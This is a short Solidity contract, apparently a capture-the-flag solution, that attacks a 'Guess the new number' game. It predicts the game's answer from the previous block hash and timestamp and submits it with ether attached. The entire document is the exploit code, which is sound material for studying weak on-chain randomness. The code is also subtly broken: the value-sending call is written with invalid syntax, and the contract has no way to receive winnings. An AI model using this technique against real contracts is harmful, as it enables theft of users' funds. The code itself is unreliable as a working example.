pragma solidity ^0.4.21;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) public payable;
}

contract GuessTheNewNumberChallenge {
    IGuessTheNewNumberChallenge victim;

    constructor(address victimAddress) public {
        victim = IGuessTheNewNumberChallenge(victimAddress);
    }

    function attack() public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        victim.value(msg.value).guess(answer);
    }
}
